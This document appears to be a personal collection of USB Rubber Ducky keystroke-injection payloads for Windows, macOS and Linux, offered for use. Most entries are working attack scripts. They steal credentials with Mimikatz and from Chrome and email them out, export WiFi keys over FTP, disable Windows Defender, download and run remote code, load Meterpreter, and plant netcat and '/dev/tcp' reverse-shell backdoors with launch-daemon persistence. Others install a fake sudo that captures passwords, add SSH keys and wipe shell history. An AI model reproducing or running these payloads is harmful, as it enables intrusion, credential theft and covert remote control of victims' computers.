# Ducky Payloads

List of payloads that I find useful to have loaded in my WiFiDuck

* [Windows](#WINDOWS)
  + [Ducky Phisher (win7)](#Ducky-Phisher-(win7))
  + [FTP upload user profile (win7)](#FTP-upload-user-profile-(win7))
  + [Powershell wget execute (win7)](#Powershell-wget-execute-(win7))
  + [Mimikatz](#Mimikatz)
  + [Mimikatz v2](#Mimikatz-v2)
  + [Wifi Export (win7)](#Wifi-Export-(win7))
  + [Enable remote access (win7)](#Enable-remote-access-(win7))
  + [Chrome password stealer](#Chrome-password-stealer)
  + [Disable windows defender (win10)](#Disable-windows-defender-(win10))
  + [Disable Windows Defender with Powershell (win10)](#Disable-Windows-Defender-with-Powershell-(win10))
  + [Download and execute through Powershell (win10)](#Download-and-execute-through-Powershell-(win10))
  + [Fast Meterpreter (win10)](#Fast-Meterpreter-(win10))

* [OSX](#OSX)
  + [Linux and OSX sudo passwd grabber](#Linux-and-OSX-sudo-passwd-grabber)
  + [OSX Root Backdoor](#OSX-Root-Backdoor)
  + [OSX User Backdoor](#OSX-User-Backdoor)
  + [Local DNS Poisoning](#Local-DNS-Poisoning)
  + [Youtube prank](#Youtube-prank)
  + [Photobooth prank](#Photobooth-prank)
  + [Curl and execute](#Curl-and-execute)
  + [Passwordless SSH Access](#Passwordless-SSH-Access)
  + [Install Bella](#Install-Bella)

* [Linux](#LINUX)
  + [Linux and OSX sudo passwd grabber](#Linux-and-OSX-sudo-passwd-grabber)

* [All Platforms](#ALL-PLATFORMS)
  + [Open Website](#Open-Website)

## WINDOWS

### Ducky Phisher (win7)
```
REM Author: .:Koryusai-Kun:.
REM Description: Used for phishing
REM ---[Start CMD as administrator]-----------------------
GUI
DELAY 50
STRING cmd
DELAY 150
MENU
DELAY 75
STRING a
ENTER
DELAY 200
LEFT
ENTER
STRING cls
ENTER
REM ---[END]----------------------------------------------
DELAY 300
REM ---[Inject into the host file]------------------------
STRING copy con inject.bat
ENTER
STRING SET NEWLINE=^& echo.
ENTER
ENTER
STRING FIND /C /I "www.serginator.com" %WINDIR%\system32\drivers\etc\hosts
ENTER
STRING IF %ERRORLEVEL% NEQ 0 ECHO %NEWLINE%^[EVIL_SERVER_IP] www.serginator.com>>%WINDIR%\system32\drivers\etc\hosts
ENTER
ENTER
STRING FIND /C /I "serginator.com" %WINDIR%\system32\drivers\etc\hosts
ENTER
STRING IF %ERRORLEVEL% NEQ 0 ECHO %NEWLINE%^[EVIL_SERVER_IP] serginator.com>>%WINDIR%\system32\drivers\etc\hosts
ENTER
CONTROL z
ENTER
STRING inject.bat
ENTER
REM ---[END]----------------------------------------------
DELAY 200
STRING exit
ENTER
```

### FTP upload user profile (win7)
```
REM Author: Robert Lampe
GUI r
DELAY 200
STRING cmd
ENTER
DELAY 600
STRING cd %USERPROFILE%
ENTER
STRING ftp -i [SERVER]
ENTER
DELAY 800
STRING [USERNAME]
ENTER
STRING [PASSWORD]
ENTER
STRING GET WinSCP.com
ENTER
DELAY 200
STRING GET WinSCP.exe
ENTER
DELAY 3000
STRING quit
ENTER
REM FTP user only needs write access.
STRING WinSCP.com /command "option batch abort" "option confirm off" "open ftp://[USERNAME2]:[PASSWORD2]@[SERVER2]" "put *.*" "close" "exit"
ENTER
ALT SPACE
STRING N
```

### Powershell wget execute (win7)
```
REM Autho: Fahad Alkamli
REM open the Run
GUI r
REM Change this value depending on the computer you are using ( i mean slow or not )
DELAY 100
STRING powershell -windowstyle hidden
ENTER
REM the shell usually takes a few  seconds to fully run so i put a delay just in case .
DELAY 1000
REM I just wanted to note that the file can be an EXE or JAR file doesn't really matter.
REM in the destination if you put the fileName only, the file will be saved under C:\Users\LoggedInUser
STRING $source = "http://www.example.com/file.txt"; $destination = "$env:temp\file.exe"; Invoke-WebRequest $source -OutFile $destination;
ENTER
DELAY 5000
STRING start-process "$env:temp\file.exe"
ENTER
DELAY 100
STRING exit
ENTER
```

### Mimikatz
```
REM Author: redmeatuk
REM mimikatz ducky script to dump local wdigest passwords from memory using mimikatz (local user needs to be an administrator/have admin privs), download mimikatz from https://github.com/gentilkiwi/mimikatz/releases/latest
DELAY 3000
CONTROL ESCAPE
DELAY 1000
STRING cmd
DELAY 1000
CTRL-SHIFT ENTER
DELAY 1000
ALT y
DELAY 300
ENTER
STRING powershell (new-object System.Net.WebClient).DownloadFile('http://<replace me with webserver ip/host>/mimikatz.exe','%TEMP%\mimikatz.exe')
DELAY 300
ENTER
DELAY 3000
STRING %TEMP%\mimikatz.exe
DELAY 300
ENTER
DELAY 3000
STRING privilege::debug
DELAY 300
ENTER
DELAY 1000
STRING sekurlsa::logonPasswords full
DELAY 300
ENTER
DELAY 1000
STRING exit
DELAY 300
ENTER
DELAY 100
STRING del %TEMP%\mimikatz.exe
DELAY 300
ENTER
```

### Mimikatz v2
_Change those vars_
```
'url to 32bit mimikatz.exe'
'url to 64bit mimikatz.exe'
'gmailuser', 'gmail password'
'sending email account'
'email account to send report'
```

```
REM Author: Pesce
REM Date: 10/20/2013
REM Note: Thanks to all the help everyone! This is my first attempt, don't be to upset!
REM -------------open command prompt with admin privileges
DELAY 3000
CONTROL ESCAPE
DELAY 1000
STRING cmd
DELAY 1000
CTRL-SHIFT ENTER
DELAY 1000
ALT y
ENTER
DELAY 300
REM -------------download appropriate mimikatz for architecture
STRING powershell if ([System.IntPtr]::Size -eq 4) { (new-object System.Net.WebClient).DownloadFile('http://url to 32bit mimikatz.exe','%TEMP%\pw.exe');  }else{ (new-object System.Net.WebClient).DownloadFile('http://url to 64bit mimikatz.exe','%TEMP%\pw.exe');}
ENTER
DELAY 5000
REM -------------get the passwords and save to c:\pwlog.txt
STRING %TEMP%\pw.exe > c:\pwlog.txt & type pwlog.txt;
ENTER
DELAY 2000
STRING privilege::debug
ENTER
DELAY 1000
STRING sekurlsa::logonPasswords full
ENTER
DELAY 1000
STRING exit
ENTER
DELAY 300
STRING del %TEMP%\pw.exe
ENTER
DELAY 300
REM -------------email log via gmail
STRING powershell
ENTER
DELAY 300
STRING $SMTPServer = 'smtp.gmail.com'
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
STRING $SMTPInfo.EnableSsl = $true
ENTER
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('gmailuser', 'gmail password');
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
ENTER
STRING $ReportEmail.From = 'sending email account'
ENTER
STRING $ReportEmail.To.Add('email account to send report')
ENTER
STRING $ReportEmail.Subject = 'Duck Report'
ENTER
STRING $ReportEmail.Body = 'Attached is your duck report.'
ENTER
STRING $ReportEmail.Attachments.Add('c:\pwlog.txt')
ENTER
STRING $SMTPInfo.Send($ReportEmail)
ENTER
DELAY 1000
STRING exit
ENTER
REM ---------------------delete and end
STRING del c:\pwlog.txt
ENTER
DELAY 300
STRING exit
ENTER
```

### Wifi Export (win7)
```
REM Author: Bucky67GTO
REM Disable firewall, export and send to an ftp wifi settings, then enable firewall
DELAY 2000
ESCAPE
CONTROL ESCAPE
DELAY 400
STRING cmd
DELAY 400
CTRL-SHIFT ENTER
DELAY 400
STRING netsh firewall set opmode mode=disable
ENTER
DELAY 400
STRING netsh wlan export profile key=clear
ENTER
DELAY 400
STRING cd %USERPROFILE%
ENTER
DELAY 400
STRING ftp -i ftp server
ENTER
DELAY 400
STRING username
ENTER
DELAY 400
STRING password
ENTER
DELAY 600
STRING prompt
ENTER
DELAY 400
STRING prompt
ENTER
DELAY 400
STRING MPUT *.xml
ENTER
DELAY 4000
STRING bye
ENTER
DELAY 400
STRING del *.xml
ENTER
DELAY 200
STRING netsh firewall set opmode mode=enable
ENTER
DELAY 400
ALT SPACE
STRING c
```

### Enable remote access (win7)
```
REM Author: Bucky67GTO
REM Disable firewall, create new user administrator, enable remote access, send ip to ftp
DELAY 2000
ESCAPE
CONTROL ESCAPE
DELAY 400
STRING cmd
DELAY 400
CTRL SHIFT ENTER
DELAY 400
STRING netsh firewall set opmode mode=disable
ENTER
DELAY 400
STRING ALT y
ENTER
DELAY 400
STRING net user /add [username] [password]
ENTER
DELAY 400
STRING net localgroup administrators [username] /add
ENTER
DELAY 400
STRING reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
ENTER
DELAY 400
STRING reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
ENTER
DELAY 400
STRING sc config TermService start= auto
ENTER
DELAY 400
STRING net start Termservice
ENTER
DELAY 400
STRING cd %USERPROFILE%
ENTER
DELAY 400
STRING ipconfig /all > number.txt
ENTER
DELAY 400
STRING ftp -i [ftpserver]
ENTER
DELAY 400
STRING login [name]
ENTER
DELAY 400
STRING login [password]
ENTER
DELAY 600
STRING prompt
ENTER
DELAY 400
STRING prompt
ENTER
DELAY 400
STRING PUT number.txt
ENTER
DELAY 2000
STRING bye
ENTER
DELAY 400
STRING del number.txt
ENTER
DELAY 400
ALT SPACE
STRING c
```

### Chrome password stealer
```
REM Author: Nuk3leus
REM Ducky chrome password stealer: 1.0
REM Target: Windows 7
REM Description: Opens chrome, navigates to chrome settings, navigates to saved passwords, searches for facebook, shows password, copys password
REM closes chrome, Opens notepad with bypass uac so it can save to C:\ drive and pastes in password
REM saves to C:\passwords.txt folder, closes notepad
REM sends files via gmail to account.
DELAY 2000
REM -------------open chrome
GUI r
DELAY 1000
STRING chrome
DELAY 1000
ENTER
DELAY 4000
REM -------------copy plaintext password
STRING chrome://settings/passwords
ENTER
DELAY 2000
STRING facebook
DELAY 500
TAB
DELAY 500
DOWN
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
ENTER
DELAY 500
ALT D
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
CTRL C
DELAY 500
ALT F4
DELAY 500
REM -------------save file to music folder as passwords.txt
GUI R
DELAY 500
STRING powershell start-process notepad.exe -Verb runAs
DELAY 500
ENTER
DELAY 2000
ALT y
DELAY 1000
CTRL V
DELAY 500
ALT f
DELAY 500
STRING s
DELAY 500
STRING passwords.txt
DELAY 500
TAB
TAB
TAB
TAB
TAB
TAB
TAB
TAB
TAB
STRING c
DELAY 1000
STRING l
DELAY 500
ENTER
DELAY 500
ALT S
DELAY 1000
ALT F4
DELAY 500
REM -------------email log via gmail
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1000
STRING $SMTPServer = 'smtp.gmail.com'
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
STRING $SMTPInfo.EnableSsl = $true
ENTER
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('youremail@gmail.com', 'password');
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
ENTER
STRING $ReportEmail.From = 'youremail@gmail.com'
ENTER
STRING $ReportEmail.To.Add('toemail@gmail.com')
ENTER
STRING $ReportEmail.Subject = 'Ducky chrome passwords'
ENTER
STRING $ReportEmail.Body = 'Attached is your list of passwords.'
ENTER
STRING $ReportEmail.Attachments.Add('c:\passwords.txt')
ENTER
STRING $SMTPInfo.Send($ReportEmail)
ENTER
DELAY 3000
STRING exit
ENTER
```

### Disable windows defender (win10)
```
REM turn off windows defender then clear action center
REM author:judge2020
REM You take responsibility for any laws you break with this, I simply point out the security flaw
REM
REM start of script
REM
REM let the HID enumerate
DELAY 2000
ESCAPE
DELAY 100
CONTROL ESCAPE
DELAY 100
STRING Windows Defender Settings
ENTER
DELAY 2000
REM why TAB and HOME?
TAB
DELAY 50
REM why TAB and HOME?HOME
DELAY 50
ALT F4
DELAY 3200
REM windows + a = ????
GUI a
DELAY 500
ENTER
DELAY 100
GUI a
```

### Disable Windows Defender with Powershell (win10)
```
REM Windows 10: Disable Windows Defender with Powershell
REM Author: Judge2020
REM author website: Judge2020.com
REM
DELAY 1000
GUI r
DELAY 200
REM Start an elevated powershell instance which will disable Windows Defender.
STRING powershell start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs
ENTER
DELAY 1000
REM if you need administrator [left, enter and delay 1000]
LEFT
ENTER
DELAY 1000
ALT y
```

### Download and execute through Powershell (win10)
```
REM Windows 10: Poweshell administrator download and execute file
REM Author: Judge2020
REM author website: Judge2020.com
REM let the HID enumerate
DELAY 1000
GUI r
DELAY 200
REM my best attempt at a elevated powershell instance
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 1000
ALT y
DELAY 200
STRING $down = New-Object System.Net.WebClient; $url = 'abc.exe'; $file = 'mess1.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
```

### Netcat reverse shell
```
REM Info and source: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload-Netcat-Reverse-Shell
REM Title: Netcat Reverse Shell
REM Author: Kanishk Singh
REM Version: 1

REM Change the following details:
REM [NETCAT_DOWNLOAD_LINK]: Your Netcat download link.
REM [PORT]: The port on the target machine you want netcat to listen on.
REM Directory: Use something other than %TEMP% if you want to.
DELAY 200

REM --> Minimize all windows
WINDOWS d
GUI r
DELAY 500
STRING powershell Start-Process cmd -Verb RunAs
ENTER
DELAY 1500
ALT y
DELAY 500
STRING cd %TEMP%
ENTER

REM --> Kills already running Netcat instance (if any)
STRING TASKKILL /im nc.exe /f
ENTER
REM --> Delete nc.exe file if it already exists
STRING erase /Q nc.exe
ENTER
REM --> Delete Start batch file if it already exists
STRING erase /Q Start.bat
ENTER
REM --> Delete Invisible.vbs in temp folder, if it already exists
STRING erase /Q invisible.vbs
ENTER
REM --> Delete invisible.vbs file in Startup if it already exists
STRING erase /Q "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\invisible.vbs"
ENTER
DELAY 500

REM --> Downloads NetCat
STRING powershell (new-object System.Net.WebClient).DownloadFile('http://[NETCAT_DOWNLOAD_LINK]/nc.exe','nc.exe')
ENTER
DELAY 500

REM --> Creates a batch file to start listening
STRING copy con Start.bat
ENTER
STRING nc -lp [PORT] -vv -e cmd.exe -L
ENTER
CONTROL z
ENTER

REM --> Starts batch file invisibly
STRING copy con invisible.vbs
ENTER
STRING Set WshShell = CreateObject("WScript.Shell" )
ENTER
STRING WshShell.Run chr(34) & "%TEMP%\Start.bat" & Chr(34), 0
ENTER
STRING Set WshShell = Nothing
ENTER
CONTROL z
ENTER
REM --> Add netcat to allowed programs list, enabling it to communicate through the firewall seamlessly
STRING netsh advfirewall firewall add rule name="Netcat" dir=in action=allow program="%TEMP%\nc.exe" enable=yes
ENTER
STRING start invisible.vbs
ENTER
DELAY 100

REM --> Copies invisible.vbs to startup folder for persistence
STRING copy "invisible.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
ENTER

REM --> Kills CMD while nc.exe continues running in background, remove Ducky after CMD closes
STRING exit
ENTER
```

### Fast Meterpreter (win10)
```
REM Opens a meterpreter using a pastebin link
REM See https://github.com/hak5/bashbunny-payloads/blob/master/payloads/library/remote_access/SingleSecondShell/readme.md
REM For how to create a link to your personal shellcode
REM or just execute 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f psh-cmd --smallest' and paste the base64 to pastebin, then add /raw/ into the link.
DELAY 2000
GUI r
DELAY 1000
STRING powershell -windowstyle hidden $u='YOUR_LINK';$r=Invoke-WebRequest -Uri $u;powershell -nop -e $r.content
ENTER
GUI r
DELAY 1000
STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
```

## OSX

### Linux and OSX sudo passwd grabber
_Run this on your server first_
```
#!/bin/bash
while [ true ]
do
netcat -vlp 1337 &>> passwd.txt
done
```

```
REM Author: Suryapratap
DELAY 2000
GUI space
DELAY 500
ALT F2
DELAY 500
BACKSPACE
DELAY 100
STRING terminal
ENTER
DELAY 3000
STRING rm -rf ~/.config/sudo
ENTER
DELAY 100
STRING mkdir -p ~/.config/sudo
ENTER
DELAY 100
STRING echo '#!'$SHELL > ~/.config/sudo/sudo
ENTER
STRING /usr/bin/sudo -n true 2>/dev/null
ENTER
STRING if [ $? -eq 0 ]
ENTER
STRING then
ENTER
STRING /usr/bin/sudo $@
ENTER
STRING else
ENTER
STRING echo -n "[sudo] password for $USER: "
ENTER
STRING read -s pwd
ENTER
STRING echo
ENTER
STRING echo "$pwd" | /usr/bin/sudo -S true 2>/dev/null
ENTER
STRING if [ $? -eq 1 ]
ENTER
STRING then
ENTER
STRING echo "$USER:$pwd:invalid" > /dev/tcp/[your_server]/1337
ENTER
STRING echo "Sorry, try again."
ENTER
STRING sudo $@
ENTER
STRING else
ENTER
STRING echo "$USER:$pwd:valid" > /dev/tcp/[your_server]/1337
ENTER
STRING echo "$pwd" | /usr/bin/sudo -S $@
ENTER
STRING fi
ENTER
STRING fi' > ~/.config/sudo/sudo
ENTER
DELAY 100
STRING chmod u+x ~/.config/sudo/sudo
ENTER
DELAY 100
STRING echo "export PATH=~/.config/sudo:$PATH" >> ~/.bash_profile
ENTER
DELAY 100
STRING echo "export PATH=~/.config/sudo:$PATH" >> ~/.bashrc
ENTER
DELAY 100
STRING history -c && rm .bash_history && exit
ENTER
DELAY 400
GUI q
```

### OSX Root Backdoor
_Put your server listening_
```
nc -l -p 1337
```

```
REM Patrick Mosca
REM A simple script for rooting OSX from single user mode.
REM Change mysite.com to your domain name or IP address
REM Change 1337 to your port number
REM Catch the shell with 'nc -l -p 1337'
REM http://patrickmosca.com/root-a-mac-in-10-seconds-or-less/
DELAY 1000
STRING mount -uw /
ENTER
DELAY 2000
STRING mkdir /Library/.hidden
ENTER
DELAY 200
STRING echo '#!/bin/bash
ENTER
STRING bash -i >& /dev/tcp/mysite.com/1337 0>&1
ENTER
STRING wait' > /Library/.hidden/connect.sh
ENTER
DELAY 500
STRING chmod +x /Library/.hidden/connect.sh
ENTER
DELAY 200
STRING mkdir /Library/LaunchDaemons
ENTER
DELAY 200
STRING echo '<plist version="1.0">
ENTER
STRING <dict>
ENTER
STRING <key>Label</key>
ENTER
STRING <string>com.apples.services</string>
ENTER
STRING <key>ProgramArguments</key>
ENTER
STRING <array>
ENTER
STRING <string>/bin/sh</string>
ENTER
STRING <string>/Library/.hidden/connect.sh</string>
ENTER
STRING </array>
ENTER
STRING <key>RunAtLoad</key>
ENTER
STRING <true/>
ENTER
STRING <key>StartInterval</key>
ENTER
STRING <integer>60</integer>
ENTER
STRING <key>AbandonProcessGroup</key>
ENTER
STRING <true/>
ENTER
STRING </dict>
ENTER
STRING </plist>' > /Library/LaunchDaemons/com.apples.services.plist
ENTER
DELAY 500
STRING chmod 600 /Library/LaunchDaemons/com.apples.services.plist
ENTER
DELAY 200
STRING launchctl load /Library/LaunchDaemons/com.apples.services.plist
ENTER
DELAY 1000
STRING shutdown -h now
ENTER
```

### OSX User Backdoor
_Put your server listening_
```
nc -l -p 1337
```

```
REM Patrick Mosca
REM A simple script for creating a persistent backdoor on OSX.
REM Change mysite.com to your domain name or IP address
REM Change 1337 to your port number
REM Catch the shell with 'nc -l -p 1337'
REM http://patrickmosca.com/root-a-mac-in-10-seconds-or-less/
DELAY 1000
GUI SPACE
STRING terminal
DELAY 500
ENTER
DELAY 500
STRING mkdir ~/Library/.hidden
ENTER
DELAY 200
STRING echo '#!/bin/bash
ENTER
STRING bash -i >& /dev/tcp/mysite.com/1337 0>&1
ENTER
STRING wait' > ~/Library/.hidden/connect.sh
ENTER
DELAY 500
STRING chmod +x ~/Library/.hidden/connect.sh
ENTER
DELAY 200
STRING mkdir ~/Library/LaunchAgents
ENTER
DELAY 200
STRING echo '<plist version="1.0">
ENTER
STRING <dict>
ENTER
STRING <key>Label</key>
ENTER
STRING <string>com.apples.services</string>
ENTER
STRING <key>ProgramArguments</key>
ENTER
STRING <array>
ENTER
STRING <string>/bin/sh</string>
ENTER
STRING <string>'$HOME'/Library/.hidden/connect.sh</string>
ENTER
STRING </array>
ENTER
STRING <key>RunAtLoad</key>
ENTER
STRING <true/>
ENTER
STRING <key>StartInterval</key>
ENTER
STRING <integer>60</integer>
ENTER
STRING <key>AbandonProcessGroup</key>
ENTER
STRING <true/>
ENTER
STRING </dict>
ENTER
STRING </plist>' > ~/Library/LaunchAgents/com.apples.services.plist
ENTER
DELAY 200
STRING chmod 600 ~/Library/LaunchAgents/com.apples.services.plist
ENTER
DELAY 200
STRING launchctl load ~/Library/LaunchAgents/com.apples.services.plist
ENTER
DELAY 200
GUI q
```

### Local DNS Poisoning
```
REM Author: SWISA
REM A script to create a local DNS entry in the host file of a mac.
REM change the example.com to any site you want.
REM change the 127.0.0.1 to any ip you want.
DELAY 1000
STRING mount -uw /
ENTER
DELAY 2000
ENTER
STRING nano /private/etc/hosts
ENTER
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
DOWNARROW
STRING 127.0.0.1 example.com
ENTER
STRING 127.0.0.1 www.example.com
ENTER
CTRL o
ENTER
CTRL x
STRING shutdown -h now
```

### Youtube prank
```
REM Author: Cody Theodore
REM Title: OSX Youtube Blast
REM This payload will open terminal, crank up the Macs volume all the way, then open a youtube video of
REM your choice by replacing the link.
DELAY 1000
GUI SPACE
STRING terminal
DELAY 500
ENTER
DELAY 4000
STRING osascript -e 'set volume 7'
DELAY 500
ENTER
DELAY 500
STRING open https://www.youtube.com/watch?v=dQw4w9WgXcQ
DELAY 500
ENTER
```

### Photobooth prank
```
REM Author: Cameron Glass
REM --------------------------------
DELAY 1000
GUI SPACE
DELAY 100
STRING photo booth
DELAY 100
ENTER
DELAY 1000
ENTER
DELAY 3000
GUI SPACE
DELAY 100
STRING terminal
DELAY 100
ENTER
DELAY 1000
STRING say Hostia, no sales muy allá que digamos, eh?
DELAY 100
ENTER
```

### Curl and execute
```
REM Author: Jesse Wallace (c0deous)
DELAY 1000
COMMAND SPACE
DELAY 800
STRING Terminal
DELAY 500
ENTER
DELAY 500
STRING curl http://SERVER/path/to/file > file
ENTER
DELAY 1000
STRING ./file
ENTER
```

### Passwordless SSH Access
```
REM Author: Jesse Wallace (c0deous)

DELAY 1000
COMMAND SPACE
DELAY 500
STRING Terminal
DELAY 500
ENTER
DELAY 800
STRING echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCyyfIO78wxrTGnszwqaADZjwxF/uccAPwVj3osSjRQQ3NdHKx9yOHlWqj91QxdmGq+vDR2ArFXsbYmBIff9LGdCcV55OnU7OvDRJQwfX+o+1d8ql4nivqwxJEdUWovdL4vMuYsMMwfDCR7RFB7mHK61hGu8Sn9yvRJi0qK0wlkOyT1KX0xN5H9velDg1eUbWUlIFNZ+XGdH8wpL1bGTMl5tcu2WB8rrRE3mEdQKUeiPzEidDOOdu0vOOxtbs/MxB6sCRFo4TO0iap2eRoLb07tBsEWSbu+GO9RvEK5Y7pmrP/CuYPKHe+Jd9XLGQ3r4TCzoYyR1vKnCxQudzALQb9Z serginator@gmail.com' >> ~/.ssh/authorized_keys
ENTER
DELAY 1000
STRING killall Terminal
ENTER
```

### Install Bella
_First [make the installer](https://github.com/dayofdoom/Bella) and put it in your server_
```
REM Author: killingit57
DELAY 1000
REM --------------- OPEN TERMINAL ---------------
COMMAND SPACE
DELAY 800
STRING Terminal
DELAY 500
ENTER
REM --------------- GRAB BELLA ZIP ---------------
DELAY 500
STRING curl -O https://mywebsite.com/Bella.zip
ENTER
REM --------------- UNZIP BELLA ---------------
DELAY 800
STRING unzip Bella.zip
ENTER
REM --------------- INSTALL BELLA ---------------
DELAY 800
STRING python Bella
ENTER
REM --------------- REMOVE BELLA INSTALL LEFTOVERS ---------------
DELAY 600
STRING rm -rf Bella.zip
ENTER
DELAY 500
STRING rm -rf __MACOSX
ENTER
REM --------------- REMOVE TERMINAL HISTORY ---------------
DELAY 500
STRING history -c
ENTER
REM --------------- CLOSE TERMINAL ---------------
DELAY 500
STRING exit
ENTER
COMMAND Q
```

## LINUX


## ALL PLATFORMS

### Open Website

```
REM Author: KTibow
DELAY 600
REM Linux run dialog
ALT F2
DELAY 200
REM Mac OS run dialog
GUI SPACE
DELAY 200
REM On Windows this changes the input language, so press 3 times
GUI SPACE
DELAY 200
GUI SPACE
DELAY 200
GUI r
DELAY 200
REM On another OS, this could have typed "   r". Backspace 4 times.
DELETE
REPEAT 4
REM Type in URL and open page!
STRING http://www.serginator.com
ENTER
```
